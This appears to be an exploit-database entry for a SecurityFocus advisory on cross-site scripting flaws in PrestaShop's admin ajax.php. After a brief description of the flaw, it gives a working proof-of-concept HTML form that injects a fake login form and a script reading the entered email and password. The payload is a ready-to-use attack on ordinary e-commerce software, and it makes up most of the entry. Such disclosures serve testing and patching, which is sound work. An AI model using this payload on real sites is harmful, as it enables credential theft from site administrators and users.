@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/55280/info
+
+PrestaShop is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+<form action="http://[host]/[ADMIN_PANEL]/ajax.php" method="post"> <input type="hidden" name="ajaxProductsPositions" value='' /> <input type="hidden" name="id_product" value='1' /> <input type="hidden" name="id_category" value='1' /> <input type="hidden" name='product[<form action="/[ADMIN_PANEL]/login.php" method="post"><input type="text" id="email" name="email" value="" class="input"/><input id="passwd" type="password" name="passwd" class="input" value=""/></form><script>function hackfunc() { alert("Your Login: "+document.getElementById("email").value+"\nYour Password: "+document.getElementById("passwd").value); } setTimeout("hackfunc()", 1000);</script>]' value='1_1_1' /> <input type="submit" id="btn"> </form> 
